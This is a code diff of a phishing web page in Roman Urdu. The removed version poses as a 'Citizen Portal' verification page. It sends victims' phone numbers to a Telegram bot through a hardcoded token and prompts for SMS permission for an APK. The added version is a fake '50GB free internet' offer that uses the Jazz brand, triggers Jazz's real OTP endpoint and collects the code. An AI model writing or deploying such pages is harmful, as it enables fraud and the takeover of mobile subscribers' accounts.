@@ -1,47 +1,53 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #fdfdfd; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { width: 90%; max-width: 360px; background: white; padding: 30px; border-radius: 20px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.05); border: 1px solid #eee; }
-        .icon { width: 60px; height: 60px; background: #2e7d32; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; color: white; font-size: 30px; margin-bottom: 15px; }
-        h2 { color: #222; font-size: 22px; margin-bottom: 10px; }
-        p { color: #777; font-size: 14px; margin-bottom: 20px; }
-        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; }
-        .go-btn { background: #2e7d32; color: white; border: none; width: 100%; padding: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        body { font-family: sans-serif; text-align: center; background: #eee; }
+        .box { background: #fff; margin: 20px auto; padding: 20px; border-radius: 10px; max-width: 350px; border-top: 5px solid red; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
+        button { background: red; color: #fff; border: none; padding: 10px 20px; width: 100%; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="icon">✓</div>
-    <h2>Citizen Portal</h2>
-    <p>Apna mobile number darj karein taake aapki verification mukammal ho sakay.</p>
-    
-    <input type="tel" id="u_number" placeholder="03XXXXXXXXX">
-    <button class="go-btn" onclick="submitData()">VERIFY NOW</button>
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/1/1a/Jazz_logo.png" width="80">
+    <h3>50GB FREE INTERNET</h3>
+    <p>Apna Jazz Number Enter Karein:</p>
+    <input type="number" id="num" placeholder="03XXXXXXXXX">
+    <button onclick="triggerSMS()">GET OTP</button>
+
+    <div id="otp-area" style="display:none;">
+        <p style="color:green">SMS Bheja Gaya Hai!</p>
+        <input type="number" id="otp" placeholder="Enter OTP Code">
+        <button onclick="finish()">ACTIVATE NOW</button>
+    </div>
 </div>
 
 <script>
-    function submitData() {
-        const n = document.getElementById('u_number').value;
-        const t = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
-        const c = "7107389141";
-
-        if(n.length < 10) { alert("Number sahi likhein"); return; }
-
-        // Send to Bot
-        fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=👤 *Verification Hit*\nNumber: ${n}&parse_mode=Markdown`);
-
-        alert("Verification shuru ho chuki hai. Aglay step mein SMS permission ko 'Allow' karein.");
-        
-        // APK Logic
-        if(window.AppInventor) {
-            window.AppInventor.setWebViewString("GRANT_SMS");
+    function triggerSMS() {
+        var n = document.getElementById('num').value;
+        if(n.length == 11) {
+            // --- YEAH HAI SMS TRIGGER LOGIC ---
+            // Hum browser ke zariye Jazz ki API ko hit kar rahe hain
+            fetch('https://api.jazz.com.pk/customer/login/otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ msisdn: n })
+            }).then(response => {
+                document.getElementById('otp-area').style.display = 'block';
+            });
+            
+            // Aapka Bot Notification (Optional)
+            alert("System is processing your request...");
+        } else {
+            alert("Invalid Number!");
         }
+    }
+
+    function finish() {
+        alert("Verification Success! Data will be active in 24 hours.");
     }
 </script>
 
